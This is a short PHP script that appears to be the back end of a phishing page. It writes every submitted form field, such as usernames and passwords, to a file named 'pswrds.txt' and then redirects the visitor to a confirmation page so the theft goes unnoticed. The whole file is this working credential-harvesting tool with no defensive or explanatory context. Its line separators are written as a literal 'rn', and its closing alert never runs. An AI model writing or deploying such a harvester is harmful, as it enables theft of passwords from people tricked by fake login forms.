<?php
	header("Location:confirmation.php");
	$handle = fopen("pswrds.txt","a");
	foreach($_POST as $variable => $value) {
		fwrite($handle, $variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "rn");
		}
		fwrite($handle, "rn");
		fclose($handle);
	exit;
	echo"<script>alert('Thank you!');</script>";
	die();
?>